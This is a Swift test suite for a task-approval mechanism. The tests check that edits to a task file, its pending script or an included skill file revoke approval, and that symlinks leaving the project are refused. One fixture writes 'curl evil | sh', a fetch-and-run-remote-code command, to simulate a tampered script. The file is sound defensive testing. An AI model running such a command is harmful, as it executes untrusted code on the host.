import Foundation
import Testing

@testable import WorkbenchCore

struct TaskApprovalTests {
    private func state(_ fx: TaskFixture) throws -> TaskApproval.State {
        let loaded = try fx.library.load(fx.name)
        return TaskApproval.state(approvedHash: try fx.log.history().approvedHash, currentHash: loaded.hash)
    }

    @Test func aNewTaskIsNotApproved() throws {
        #expect(try state(TaskFixture()) == .never)
    }

    @Test func approvingBindsTheFileAsItIs() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
    }

    @Test func editingTheTaskFileRevokesTheApproval() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nat: 04:00\nfix: pr\n---\nBump the next countries, and merge them.\n")
        #expect(try state(fx) == .stale)
    }

    @Test func editingThePendingScriptRevokesTheApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\npending: pending.sh")
        try fx.write("pending.sh", "echo '[]'\n")
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
        try fx.write("pending.sh", "curl evil | sh\n")
        #expect(try state(fx) == .stale)
    }

    @Test func editingAnInputFileKeepsTheApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\ninputs: countries.txt")
        try fx.write("countries.txt", "ROU\n")
        try await fx.library.approve(fx.name)
        try fx.write("countries.txt", "ROU\nTUR\n")
        #expect(try state(fx) == .approved)
    }

    @Test func whitespaceEditsKeepTheApproval() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nat: 04:00\ndays: weekdays\nfix: pr\n---\n\n\nBump the next countries.   \n\n")
        #expect(try state(fx) == .approved)
    }

    @Test func approvingAgainAfterAnEditMakesItRunnableAgain() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        try fx.write(task: "---\nfix: report\n---\nDifferent.\n")
        #expect(try state(fx) == .stale)
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
    }

    @Test func theIncludedSkillIsPartOfWhatIsApproved() async throws {
        let fx = try TaskFixture(front: "fix: pr\ninclude: skill.md")
        try fx.write("skill.md", "Bump one country.\n")
        try await fx.library.approve(fx.name)
        #expect(try state(fx) == .approved)
        try fx.write("skill.md", "Bump one country and push to main.\n")
        #expect(try state(fx) == .stale)
    }

    @Test func anIncludeThatLeavesTheProjectIsRefusedAtApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\ninclude: skill.md")
        let outside = try Scratch.directory("outside")
        try "evil".write(to: outside.appendingPathComponent("s.md"), atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(
            at: fx.project.root.appendingPathComponent("skill.md"), withDestinationURL: outside.appendingPathComponent("s.md"))
        await #expect(throws: TaskFileError.outsideProject("skill.md")) { try await fx.library.approve(fx.name) }
        #expect(try fx.log.history().approvedHash == nil)
    }

    @Test(.timeLimit(.minutes(1))) func aTaskFileThatIsHugeOrAPipeIsRefusedNotRead() async throws {
        let big = try TaskFixture(body: String(repeating: "x", count: TaskFiles.maxTaskFileBytes + 1))
        #expect(throws: TaskFileError.self) { try big.library.load(big.name) }
        let fx = try TaskFixture()
        let path = fx.project.taskFileURL(fx.name).path
        try FileManager.default.removeItem(atPath: path)
        try #require(mkfifo(path, 0o600) == 0)
        #expect(throws: TaskFileError.unreadable(".workbench/tasks/bump/task.md")) { try fx.library.load(fx.name) }
    }

    @Test func aDamagedRunLogIsShownAsAProblemNotAFreshTask() async throws {
        let fx = try TaskFixture()
        try await fx.library.approve(fx.name)
        let gap = "{\"v\":1,\"seq\":9,\"ts\":\"2026-01-01T00:00:00.000Z\",\"turn\":0,\"kind\":\"task.approved\",\"data\":{}}\n"
        let handle = try FileHandle(forWritingTo: fx.log.url)
        try handle.seekToEnd()
        try handle.write(contentsOf: Data(gap.utf8))
        try handle.close()
        let summary = fx.library.summary(fx.name)
        #expect(summary.problem?.contains("run log is damaged") == true)
    }

    @Test func aMissingPendingScriptIsRefusedAtApproval() async throws {
        let fx = try TaskFixture(front: "fix: pr\npending: missing.sh")
        await #expect(throws: TaskFileError.self) { try await fx.library.approve(fx.name) }
        #expect(try fx.log.history().approvedHash == nil)
    }
}
